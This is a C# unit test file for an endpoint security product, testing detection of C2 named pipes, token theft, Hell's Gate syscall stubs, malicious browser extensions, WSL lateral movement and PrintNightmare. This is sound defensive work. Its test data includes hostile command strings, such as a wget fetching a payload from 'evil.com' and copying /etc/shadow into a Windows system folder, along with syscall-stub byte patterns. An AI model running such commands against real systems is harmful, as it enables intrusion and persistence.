using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using Xunit;
using Sentinel.Core;

namespace Sentinel.Tests
{
    /// <summary>
    /// Comprehensive tests for all v1.6.8 features:
    /// - BrowserC2Guard detection patterns
    /// - EtwThreatIntelMonitor RWX detection helpers
    /// - SyscallStubMonitor Hell's Gate pattern detection
    /// - PrintSpoolerMonitor PrintNightmare detection
    /// - WslMonitor container lateral movement
    /// - New composite detections (pipe+beacon, token+lateral)
    /// - ContextBus signal integration (NamedPipeSignal, TokenTheftSignal)
    /// - EnrichmentSignal model correctness
    /// </summary>
    public class V168FeatureTests
    {
        #region Composite Detection: Named Pipe C2 + Network Beaconing (0.95)

        [Fact]
        public async Task Composite_NamedPipeC2PlusBeaconing_Fires()
        {
            var (engine, getResult) = CreateEngine();
            await engine.RegisterSignalAsync(new DetectionEvent
            {
                RuleName = "Named Pipe: Known C2/Lateral Movement Pattern",
                ProcessId = 500, ProcessName = "implant.exe",
                SignalType = SignalType.NetworkC2,
                Timestamp = DateTime.UtcNow
            });
            await engine.RegisterSignalAsync(new DetectionEvent
            {
                RuleName = "C2 Beaconing Behavior",
                ProcessId = 500, ProcessName = "implant.exe",
                SignalType = SignalType.NetworkC2,
                Timestamp = DateTime.UtcNow
            });
            // The pipe+beacon composite requires Named Pipe signal + NetworkC2 type
            // Since both have NetworkC2 and one has "Named Pipe" in rule name, it should fire
            var result = getResult();
            Assert.NotNull(result);
            Assert.Equal("Named Pipe C2 + Network Beaconing", result!.RuleName);
            Assert.Equal(0.95, result.Confidence);
        }

        [Fact]
        public async Task Composite_NamedPipeC2_DoesNotFire_WithoutBeaconing()
        {
            var (engine, getResult) = CreateEngine();
            await engine.RegisterSignalAsync(new DetectionEvent
            {
                RuleName = "Named Pipe: Known C2/Lateral Movement Pattern",
                ProcessId = 501, ProcessName = "implant.exe",
                SignalType = SignalType.NetworkC2,
                Timestamp = DateTime.UtcNow
            });
            // Only one signal - composite should NOT fire
            Assert.Null(getResult());
        }

        [Fact]
        public async Task Composite_NamedPipeC2_DoesNotFire_CrossPid()
        {
            var (engine, getResult) = CreateEngine();
            await engine.RegisterSignalAsync(new DetectionEvent
            {
                RuleName = "Named Pipe: Known C2/Lateral Movement Pattern",
                ProcessId = 502, ProcessName = "implant.exe",
                SignalType = SignalType.NetworkC2,
                Timestamp = DateTime.UtcNow
            });
            await engine.RegisterSignalAsync(new DetectionEvent
            {
                RuleName = "C2 Beaconing Behavior",
                ProcessId = 999, ProcessName = "other.exe",
                SignalType = SignalType.NetworkC2,
                Timestamp = DateTime.UtcNow
            });
            // Different PIDs - should not fire composite
            var result = getResult();
            // If anything fired it would be on PID 502 or 999 individually
            // but not a pipe+beacon composite since they're on different PIDs
            Assert.True(result == null || result.RuleName != "Named Pipe C2 + Network Beaconing");
        }

        #endregion

        #region Composite Detection: Token Theft + Lateral Movement (0.93)

        [Fact]
        public async Task Composite_TokenTheftPlusLateralMovement_Fires()
        {
            var (engine, getResult) = CreateEngine();
            // Use SuspiciousProcess signal type to avoid triggering "Credential Dump + Exfiltration"
            // which fires at higher priority when CredentialTheft + NetworkC2 are combined
            await engine.RegisterSignalAsync(new DetectionEvent
            {
                RuleName = "Token Theft: Non-Service Process with SYSTEM Token",
                ProcessId = 600, ProcessName = "potato.exe",
                SignalType = SignalType.SuspiciousProcess,
                Timestamp = DateTime.UtcNow
            });
            await engine.RegisterSignalAsync(new DetectionEvent
            {
                RuleName = "RPC Lateral Movement: Outbound",
                ProcessId = 600, ProcessName = "potato.exe",
                SignalType = SignalType.SuspiciousProcess,
                Timestamp = DateTime.UtcNow
            });
            var result = getResult();
            Assert.NotNull(result);
            Assert.Equal("Token Theft + Lateral Movement", result!.RuleName);
            Assert.Equal(0.93, result.Confidence);
        }

        [Fact]
        public async Task Composite_TokenTheftPlusNamedPipe_Fires()
        {
            var (engine, getResult) = CreateEngine();
            await engine.RegisterSignalAsync(new DetectionEvent
            {
                RuleName = "Token Theft: SeImpersonatePrivilege from Suspicious Path",
                ProcessId = 601, ProcessName = "juicy.exe",
                SignalType = SignalType.SuspiciousProcess,
                Timestamp = DateTime.UtcNow
            });
            await engine.RegisterSignalAsync(new DetectionEvent
            {
                RuleName = "Named Pipe: Known C2/Lateral Movement Pattern",
                ProcessId = 601, ProcessName = "juicy.exe",
                SignalType = SignalType.SuspiciousProcess,
                Timestamp = DateTime.UtcNow
            });
            var result = getResult();
            Assert.NotNull(result);
            Assert.Equal("Token Theft + Lateral Movement", result!.RuleName);
        }

        [Fact]
        public async Task Composite_TokenTheft_DoesNotFire_Alone()
        {
            var (engine, getResult) = CreateEngine();
            await engine.RegisterSignalAsync(new DetectionEvent
            {
                RuleName = "Token Theft: Non-Service Process with SYSTEM Token",
                ProcessId = 602, ProcessName = "potato.exe",
                SignalType = SignalType.CredentialTheft,
                Timestamp = DateTime.UtcNow
            });
            Assert.Null(getResult());
        }

        #endregion

        #region EnrichmentSignal Models

        [Fact]
        public void NamedPipeSignal_DefaultProperties()
        {
            var signal = new NamedPipeSignal
            {
                ProcessId = 1234,
                ProcessName = "beacon.exe",
                SourceMonitor = "NamedPipeMonitor",
                PipeName = "msagent_ab12",
                MatchedPattern = @"^msagent_[a-f0-9]{2,8}$",
                OwnerPid = 1234,
                IsKnownBadPattern = true,
                Entropy = 3.5
            };

            Assert.Equal(1234, signal.ProcessId);
            Assert.Equal("beacon.exe", signal.ProcessName);
            Assert.Equal("NamedPipeMonitor", signal.SourceMonitor);
            Assert.Equal("msagent_ab12", signal.PipeName);
            Assert.True(signal.IsKnownBadPattern);
            Assert.Equal(3.5, signal.Entropy);
            Assert.False(signal.IsExpired);
        }

        [Fact]
        public void TokenTheftSignal_DefaultProperties()
        {
            var signal = new TokenTheftSignal
            {
                ProcessId = 5678,
                ProcessName = "potato.exe",
                SourceMonitor = "TokenTheftMonitor",
                TokenUserName = @"NT AUTHORITY\SYSTEM",
                TheftType = TokenTheftType.SystemTokenFromUserProcess,
                ImagePath = @"C:\Temp\potato.exe",
                HasImpersonatePrivilege = true
            };

            Assert.Equal(5678, signal.ProcessId);
            Assert.Equal(@"NT AUTHORITY\SYSTEM", signal.TokenUserName);
            Assert.Equal(TokenTheftType.SystemTokenFromUserProcess, signal.TheftType);
            Assert.True(signal.HasImpersonatePrivilege);
            Assert.False(signal.IsExpired);
        }

        [Fact]
        public void TokenTheftSignal_Expires_AfterTtl()
        {
            var signal = new TokenTheftSignal
            {
                ProcessId = 100,
                ProcessName = "test.exe",
                SourceMonitor = "TokenTheftMonitor",
                Ttl = TimeSpan.FromMilliseconds(1),
                Timestamp = DateTimeOffset.UtcNow.AddSeconds(-10)
            };
            Assert.True(signal.IsExpired);
        }

        [Fact]
        public void NamedPipeSignal_Expires_AfterTtl()
        {
            var signal = new NamedPipeSignal
            {
                ProcessId = 100,
                ProcessName = "test.exe",
                SourceMonitor = "NamedPipeMonitor",
                Ttl = TimeSpan.FromMilliseconds(1),
                Timestamp = DateTimeOffset.UtcNow.AddSeconds(-10)
            };
            Assert.True(signal.IsExpired);
        }

        [Theory]
        [InlineData(TokenTheftType.SystemTokenFromUserProcess)]
        [InlineData(TokenTheftType.ImpersonatePrivilegeFromSuspiciousPath)]
        [InlineData(TokenTheftType.CrossSessionTokenDuplication)]
        public void TokenTheftType_AllValues_Valid(TokenTheftType type)
        {
            Assert.True(Enum.IsDefined(typeof(TokenTheftType), type));
        }

        #endregion

        #region SyscallStubMonitor - Hell's Gate Pattern Detection

        [Fact]
        public void CountSyscallStubs_DetectsValidPattern()
        {
            // Valid Hell's Gate stub: 4C 8B D1 B8 xx xx 00 00 0F 05 C3
            var buffer = new byte[]
            {
                0x4C, 0x8B, 0xD1, 0xB8, 0x18, 0x00, 0x00, 0x00, // mov r10,rcx; mov eax,0x18
                0x0F, 0x05,                                       // syscall
                0xC3,                                              // ret
                0x00,
            };
            int count = SyscallStubMonitor.CountSyscallStubs(buffer, buffer.Length);
            Assert.Equal(1, count);
        }

        [Fact]
        public void CountSyscallStubs_DetectsMultipleStubs()
        {
            var buffer = new byte[]
            {
                0x4C, 0x8B, 0xD1, 0xB8, 0x18, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3, 0x90,
                0x4C, 0x8B, 0xD1, 0xB8, 0x26, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3, 0x90,
                0x4C, 0x8B, 0xD1, 0xB8, 0x50, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3, 0x90,
            };
            var hits = SyscallStubMonitor.FindSyscallStubs(buffer, buffer.Length);
            Assert.Equal(3, hits.Count);
            Assert.True(SyscallStubMonitor.IsHellsGateEvidence(hits));
        }

        [Fact]
        public void CountSyscallStubs_IgnoresNormalCode()
        {
            var buffer = new byte[]
            {
                0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x74,
                0x24, 0x10, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x48,
                0x8B, 0xF9, 0x33, 0xF6, 0x48, 0x8D, 0x0D, 0xAA,
            };
            int count = SyscallStubMonitor.CountSyscallStubs(buffer, buffer.Length);
            Assert.Equal(0, count);
        }

        [Fact]
        public void CountSyscallStubs_IgnoresInvalidSsn()
        {
            var buffer = new byte[]
            {
                0x4C, 0x8B, 0xD1, 0xB8, 0x18, 0x00, 0xFF, 0xFF, // high bytes non-zero
                0x0F, 0x05, 0xC3,
            };
            int count = SyscallStubMonitor.CountSyscallStubs(buffer, buffer.Length);
            Assert.Equal(0, count);
        }

        [Fact]
        public void CountSyscallStubs_EmptyBuffer_ReturnsZero()
        {
            int count = SyscallStubMonitor.CountSyscallStubs(Array.Empty<byte>(), 0);
            Assert.Equal(0, count);
        }

        [Fact]
        public void CountSyscallStubs_IgnoresLooseSyscallInJitNoise()
        {
            // V8/Chromium FP: mov r10,rcx; mov eax,imm then unrelated bytes then a floating syscall.
            var buffer = new byte[]
            {
                0x4C, 0x8B, 0xD1, 0xB8, 0x18, 0x00, 0x00, 0x00,
                0x48, 0x89, 0xC1, 0x90, 0x90, 0x90,
                0x0F, 0x05, 0x90, 0x90,
            };
            Assert.Equal(0, SyscallStubMonitor.CountSyscallStubs(buffer, buffer.Length));
        }

        [Fact]
        public void CountSyscallStubs_IgnoresCompactStubWithoutRet()
        {
            var buffer = new byte[]
            {
                0x4C, 0x8B, 0xD1, 0xB8, 0x18, 0x00, 0x00, 0x00,
                0x0F, 0x05, 0x90, 0x90,
            };
            Assert.Equal(0, SyscallStubMonitor.CountSyscallStubs(buffer, buffer.Length));
        }

        [Fact]
        public void CountSyscallStubs_DetectsCopiedNtdllPrologue()
        {
            var buffer = new byte[]
            {
                0x4C, 0x8B, 0xD1, 0xB8, 0x18, 0x00, 0x00, 0x00,
                0xF6, 0x04, 0x25, 0x08, 0x03, 0xFE, 0x7F, 0x01,
                0x75, 0x03, 0x0F, 0x05, 0xC3,
            };
            Assert.Equal(1, SyscallStubMonitor.CountSyscallStubs(buffer, buffer.Length));
        }

        [Fact]
        public void IsHellsGateEvidence_RequiresThreeDistinctSsns()
        {
            var sameSsn = new byte[]
            {
                0x4C, 0x8B, 0xD1, 0xB8, 0x18, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3, 0x90,
                0x4C, 0x8B, 0xD1, 0xB8, 0x18, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3, 0x90,
                0x4C, 0x8B, 0xD1, 0xB8, 0x18, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3, 0x90,
            };
            var hits = SyscallStubMonitor.FindSyscallStubs(sameSsn, sameSsn.Length);
            Assert.Equal(3, hits.Count);
            Assert.False(SyscallStubMonitor.IsHellsGateEvidence(hits));
        }

        #endregion

        #region BrowserC2Guard - Extension Permission Analysis

        [Fact]
        public void ExtractDangerousPermissions_FindsDebugger()
        {
            var manifest = """{"name":"Evil Extension","permissions":["debugger","tabs"]}""";
            var perms = TestExtractDangerousPermissions(manifest);
            Assert.Contains("debugger", perms);
            Assert.DoesNotContain("tabs", perms);
        }

        [Fact]
        public void ExtractDangerousPermissions_FindsMultiple()
        {
            var manifest = """{"name":"C2 Ext","permissions":["debugger","nativeMessaging","proxy"]}""";
            var perms = TestExtractDangerousPermissions(manifest);
            Assert.Equal(3, perms.Count);
            Assert.Contains("debugger", perms);
            Assert.Contains("nativeMessaging", perms);
            Assert.Contains("proxy", perms);
        }

        [Fact]
        public void ExtractDangerousPermissions_IgnoresSafePermissions()
        {
            var manifest = """{"name":"Safe","permissions":["tabs","history","bookmarks"]}""";
            var perms = TestExtractDangerousPermissions(manifest);
            Assert.Empty(perms);
        }

        [Fact]
        public void ExtractDangerousPermissions_ChecksHostPermissions()
        {
            var manifest = """{"name":"Ev","host_permissions":["<all_urls>"]}""";
            var perms = TestExtractDangerousPermissions(manifest);
            Assert.Contains("<all_urls>", perms);
        }

        [Fact]
        public void ExtractDangerousPermissions_HandlesEmptyManifest()
        {
            var perms = TestExtractDangerousPermissions("{}");
            Assert.Empty(perms);
        }

        [Fact]
        public void ExtractDangerousPermissions_HandlesMalformedJson()
        {
            var perms = TestExtractDangerousPermissions("not json at all");
            Assert.Empty(perms);
        }

        /// <summary>
        /// Reimplements BrowserC2Guard.ExtractDangerousPermissions for testing.
        /// </summary>
        private static List<string> TestExtractDangerousPermissions(string manifestJson)
        {
            var dangerous = new HashSet<string>(StringComparer.OrdinalIgnoreCase)
            {
                "debugger", "nativeMessaging", "webRequestBlocking",
                "proxy", "<all_urls>", "cookies", "management"
            };
            var found = new List<string>();
            try
            {
                using var doc = System.Text.Json.JsonDocument.Parse(manifestJson);
                var root = doc.RootElement;
                CheckArray(root, "permissions", dangerous, found);
                CheckArray(root, "optional_permissions", dangerous, found);
                CheckArray(root, "host_permissions", dangerous, found);
            }
            catch { }
            return found;
        }

        private static void CheckArray(System.Text.Json.JsonElement root, string prop,
            HashSet<string> dangerous, List<string> found)
        {
            if (root.TryGetProperty(prop, out var arr) &&
                arr.ValueKind == System.Text.Json.JsonValueKind.Array)
            {
                foreach (var perm in arr.EnumerateArray())
                {
                    var val = perm.GetString();
                    if (val != null && dangerous.Contains(val))
                        found.Add(val);
                }
            }
        }

        #endregion

        #region BrowserC2Guard - Debug Port Extraction

        [Theory]
        [InlineData("chrome.exe --remote-debugging-port=9222 --headless", 9222)]
        [InlineData("msedge.exe --remote-debugging-port=9333", 9333)]
        [InlineData("brave.exe --user-data-dir=C:\\tmp --remote-debugging-port=4444 --no-sandbox", 4444)]
        [InlineData("chrome.exe --no-sandbox", -1)]
        [InlineData("chrome.exe", -1)]
        public void ExtractDebugPort_ParsesCorrectly(string cmdLine, int expected)
        {
            int result = TestExtractDebugPort(cmdLine);
            Assert.Equal(expected, result);
        }

        private static int TestExtractDebugPort(string cmdLine)
        {
            const string flag = "--remote-debugging-port=";
            int idx = cmdLine.IndexOf(flag, StringComparison.OrdinalIgnoreCase);
            if (idx < 0) return -1;
            int start = idx + flag.Length;
            int end = start;
            while (end < cmdLine.Length && char.IsDigit(cmdLine[end])) end++;
            if (end > start && int.TryParse(cmdLine.Substring(start, end - start), out int port))
                return port;
            return -1;
        }

        #endregion

        #region WslMonitor - Lateral Movement Pattern Detection

        [Theory]
        [InlineData("cp /etc/shadow /mnt/c/windows/system32/evil.dll", true)]
        [InlineData("wget -o /mnt/c/programdata/payload.exe http://evil.com/p", true)]
        [InlineData("dd if=/dev/urandom > /mnt/c/users/admin/appdata/roaming/microsoft/windows/start menu/programs/startup/evil.exe", true)]
        [InlineData("ls /mnt/c/users/admin/documents", false)]
        [InlineData("cat /etc/passwd", false)]
        [InlineData("git clone https://github.com/repo /mnt/c/projects", false)]
        public void WslLateralMovement_DetectsHostWrites(string cmd, bool shouldDetect)
        {
            var cmdLower = cmd.ToLowerInvariant();
            bool isWriteOp = cmdLower.Contains(">") || cmdLower.Contains("tee ") ||
                             cmdLower.Contains("cp ") || cmdLower.Contains("mv ") ||
                             cmdLower.Contains("dd ") || cmdLower.Contains("install ") ||
                             cmdLower.Contains("wget -o") || cmdLower.Contains("curl -o");
            bool targetsSensitive = cmdLower.Contains("/mnt/c/windows") ||
                                    cmdLower.Contains("/mnt/c/programdata") ||
                                    cmdLower.Contains("/mnt/c/program files") ||
                                    (cmdLower.Contains("/mnt/c/users") && cmdLower.Contains("startup"));
            bool detected = isWriteOp && targetsSensitive;
            Assert.Equal(shouldDetect, detected);
        }

        [Theory]
        [InlineData("reg", true)]
        [InlineData("sc", true)]
        [InlineData("bcdedit", true)]
        [InlineData("schtasks", true)]
        [InlineData("netsh", true)]
        [InlineData("certutil", true)]
        [InlineData("bitsadmin", true)]
        [InlineData("notepad", false)]
        [InlineData("git", false)]
        [InlineData("code", false)]
        public void WslInteropEscalation_DetectsSensitiveProcesses(string procName, bool isSensitive)
        {
            bool detected = procName is "reg" or "regedit" or "sc" or "bcdedit" or
                           "schtasks" or "netsh" or "wmic" or "vssadmin" or "icacls" or
                           "takeown" or "certutil" or "bitsadmin" or "mshta" or "regsvr32";
            Assert.Equal(isSensitive, detected);
        }

        #endregion

        #region PrintSpoolerMonitor - PrintNightmare Detection Logic

        [Theory]
        [InlineData("splwow64", true)]
        [InlineData("printfilterpipelinesvc", true)]
        [InlineData("cmd", false)]
        [InlineData("powershell", false)]
        [InlineData("evil", false)]
        [InlineData("mimikatz", false)]
        public void PrintSpooler_LegitimateChildProcesses(string name, bool isLegitimate)
        {
            bool result = name.Equals("splwow64", StringComparison.OrdinalIgnoreCase) ||
                          name.Equals("printfilterpipelinesvc", StringComparison.OrdinalIgnoreCase);
            Assert.Equal(isLegitimate, result);
        }

        [Theory]
        [InlineData(@"C:\Windows\System32\spool\drivers\x64\3\evil.dll", true)]
        [InlineData(@"C:\Windows\System32\spool\drivers\x64\4\payload.dll", true)]
        [InlineData(@"C:\Windows\System32\spool\drivers\W32X86\3\bad.dll", true)]
        [InlineData(@"C:\Program Files\Printer\driver.dll", false)]
        [InlineData(@"C:\Users\Admin\Desktop\test.dll", false)]
        public void PrintSpooler_DetectsDriverPaths(string path, bool isDriverPath)
        {
            bool result = path.Contains(@"\spool\drivers\", StringComparison.OrdinalIgnoreCase);
            Assert.Equal(isDriverPath, result);
        }

        #endregion

        #region ContextBus Integration - Signal Publishing Patterns

        [Fact]
        public void NamedPipeSignal_KnownBadPattern_HasCorrectFields()
        {
            var signal = new NamedPipeSignal
            {
                ProcessId = 1000,
                ProcessName = "csexec.exe",
                SourceMonitor = "NamedPipeMonitor",
                PipeName = "csexec_deadbeef",
                MatchedPattern = @"^csexec_[a-f0-9]+$",
                OwnerPid = 1000,
                IsKnownBadPattern = true,
                Entropy = 3.8
            };

            Assert.True(signal.IsKnownBadPattern);
            Assert.Equal("csexec_deadbeef", signal.PipeName);
            Assert.Equal((uint)1000, signal.OwnerPid);
        }

        [Fact]
        public void NamedPipeSignal_HighEntropy_HasCorrectFields()
        {
            var signal = new NamedPipeSignal
            {
                ProcessId = 2000,
                ProcessName = "unknown.exe",
                SourceMonitor = "NamedPipeMonitor",
                PipeName = "xk7f2m9qp4zt",
                MatchedPattern = string.Empty,
                OwnerPid = 2000,
                IsKnownBadPattern = false,
                Entropy = 4.5
            };

            Assert.False(signal.IsKnownBadPattern);
            Assert.Equal(4.5, signal.Entropy);
            Assert.Empty(signal.MatchedPattern);
        }

        [Fact]
        public void TokenTheftSignal_SystemToken_HasCorrectFields()
        {
            var signal = new TokenTheftSignal
            {
                ProcessId = 3000,
                ProcessName = "juicypotato.exe",
                SourceMonitor = "TokenTheftMonitor",
                TokenUserName = @"NT AUTHORITY\SYSTEM",
                TheftType = TokenTheftType.SystemTokenFromUserProcess,
                ImagePath = @"C:\Users\Admin\Downloads\juicypotato.exe",
                HasImpersonatePrivilege = true
            };

            Assert.Equal(TokenTheftType.SystemTokenFromUserProcess, signal.TheftType);
            Assert.Contains("SYSTEM", signal.TokenUserName);
        }

        [Fact]
        public void TokenTheftSignal_ImpersonatePrivilege_HasCorrectFields()
        {
            var signal = new TokenTheftSignal
            {
                ProcessId = 3001,
                ProcessName = "printspoofer.exe",
                SourceMonitor = "TokenTheftMonitor",
                TokenUserName = "SeImpersonatePrivilege",
                TheftType = TokenTheftType.ImpersonatePrivilegeFromSuspiciousPath,
                ImagePath = @"C:\Temp\printspoofer.exe",
                HasImpersonatePrivilege = true
            };

            Assert.Equal(TokenTheftType.ImpersonatePrivilegeFromSuspiciousPath, signal.TheftType);
            Assert.True(signal.HasImpersonatePrivilege);
        }

        #endregion

        #region Security Invariants - v1.6.8 Composites Must Be Tier1 Kill-Authorized

        [Fact]
        public async Task Composite_PipeBeacon_IsTier1KillAuthorized()
        {
            var (engine, getResult) = CreateEngine();
            await engine.RegisterSignalAsync(new DetectionEvent
            {
                RuleName = "Named Pipe: Known C2/Lateral Movement Pattern",
                ProcessId = 700, ProcessName = "evil.exe",
                SignalType = SignalType.NetworkC2,
                Tier = DetectionTier.Tier1Behavioral,
                Timestamp = DateTime.UtcNow
            });
            await engine.RegisterSignalAsync(new DetectionEvent
            {
                RuleName = "C2 Beaconing Behavior",
                ProcessId = 700, ProcessName = "evil.exe",
                SignalType = SignalType.NetworkC2,
                Tier = DetectionTier.Tier1Behavioral,
                Timestamp = DateTime.UtcNow
            });
            var result = getResult();
            Assert.NotNull(result);
            Assert.Equal(DetectionTier.Tier1Behavioral, result!.Tier);
            Assert.True(result.KillAuthorized);
        }

        [Fact]
        public async Task Composite_TokenLateral_IsTier1KillAuthorized()
        {
            var (engine, getResult) = CreateEngine();
            await engine.RegisterSignalAsync(new DetectionEvent
            {
                RuleName = "Token Theft: Non-Service Process with SYSTEM Token",
                ProcessId = 701, ProcessName = "evil.exe",
                SignalType = SignalType.CredentialTheft,
                Tier = DetectionTier.Tier1Behavioral,
                Timestamp = DateTime.UtcNow
            });
            await engine.RegisterSignalAsync(new DetectionEvent
            {
                RuleName = "RPC Lateral Movement: Outbound",
                ProcessId = 701, ProcessName = "evil.exe",
                SignalType = SignalType.NetworkC2,
                Tier = DetectionTier.Tier1Behavioral,
                Timestamp = DateTime.UtcNow
            });
            var result = getResult();
            Assert.NotNull(result);
            Assert.Equal(DetectionTier.Tier1Behavioral, result!.Tier);
            Assert.True(result.KillAuthorized);
        }

        #endregion

        #region Helper

        private static (BehavioralCorrelationEngine engine, Func<DetectionEvent?> getResult) CreateEngine()
        {
            var engine = new BehavioralCorrelationEngine();
            DetectionEvent? lastComposite = null;
            engine.Initialize(ev =>
            {
                lastComposite = ev;
                return Task.CompletedTask;
            });
            return (engine, () => lastComposite);
        }

        #endregion
    }
}
